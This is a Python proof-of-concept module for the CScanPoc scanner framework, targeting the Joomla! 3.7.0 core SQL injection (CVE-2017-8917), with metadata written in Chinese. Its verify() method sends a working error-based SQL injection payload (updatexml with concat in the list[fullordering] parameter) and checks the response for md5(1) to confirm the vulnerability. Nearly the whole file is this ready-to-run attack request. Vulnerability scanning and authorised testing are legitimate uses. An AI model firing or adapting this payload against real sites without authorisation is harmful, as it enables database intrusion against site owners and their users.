# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0001'  # 平台漏洞编号，留空
    name = 'Joomla! 3.7.0 Core SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-05-11'  # 漏洞公布时间
    desc = '''
        Joomla! 于5月17日发布了新版本3.7.1,（(Joomla! 3.7.1 Release News)[https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html]），本次更新中修复一个高危SQL注入漏洞（[20170501] - Core - SQL Injection)，成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-93113'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2017-8917'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Joomla! 3.7.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5320470d-42de-45e8-a520-88ce27ddeb4c'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = {'option':'com_fields','view':'fields','layout':'modal','list[fullordering]':'updatexml(0x3a,concat(1,(select md5(1))),1)'}
            request = requests.get('{target}'.format(target=self.target), params=payload)
            r = request.text
            if 'c4ca4238a0b923820dcc509a6f75849b' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
